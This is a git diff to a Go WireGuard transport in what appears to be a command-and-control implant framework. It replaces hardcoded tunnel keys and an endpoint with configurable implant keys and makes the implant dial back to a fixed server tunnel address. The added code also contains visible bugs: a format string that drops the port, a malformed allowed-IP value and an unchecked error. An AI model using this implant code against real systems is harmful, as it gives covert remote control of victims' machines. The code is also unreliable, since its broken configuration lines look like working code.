@@ -21,6 +21,7 @@ package transports
 // {{if .Config.WGc2Enabled}}
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/binary"
 	"fmt"
@@ -37,6 +38,11 @@ import (
 	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 	"golang.zx2c4.com/wireguard/tun/netstack"
+)
+
+var (
+	serverTunIP   = "192.168.174.1" // Don't let user configure this for now
+	serverTunPort = 8888
 )
 
 // socketWGWriteEnvelope - Writes a message to the TLS socket using length prefix framing
@@ -121,26 +127,26 @@ func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 // wgConnect - Get a wg connection or die trying
 func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 	tun, tnet, err := netstack.CreateNetTUN(
-		[]net.IP{net.ParseIP("192.168.2.2")},
-		[]net.IP{net.ParseIP("8.8.8.8")},
+		[]net.IP{net.ParseIP(wgPeerTunIP)},
+		[]net.IP{net.ParseIP("127.0.0.1")},
 		1420)
 	if err != nil {
 		log.Panic(err)
 	}
-	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(device.LogLevelVerbose, ""))
-	dev.IpcSet(`private_key=80da6fe746c8938a4b977577c8d5be866c89cb9bd02c0b76906cc43ed9a6b941
-public_key=2809add9a89b4e2768076e684653640cda272d84b77b05709e55a50f09b9d65e
-endpoint=192.168.1.9:53
-allowed_ip=0.0.0.0/0
-`)
-	err = dev.Up()
-	if err != nil {
-		log.Panic(err)
+	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(device.LogLevelVerbose, "[c2/wg] "))
+	wgConf := bytes.NewBuffer(nil)
+	fmt.Fprintf(wgConf, "private_key=%s\n", wgImplantPrivKey)
+	fmt.Fprintf(wgConf, "public_key=%s\n", wgServerPubKey)
+	fmt.Fprintf(wgConf, "endpoint=%s:\n", address, port)
+	fmt.Fprintf(wgConf, "allowed_ip=%s/32\n", "0.0.0.0/0")
+
+	if err := dev.IpcSetOperation(bufio.NewReader(wgConf)); err != nil {
+		return nil, nil, err
 	}
 
-	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", "192.168.2.1", 8888))
-	// connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", address, port))
-	// connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
+	dev.Up()
+
+	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverTunPort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect: %v", err)
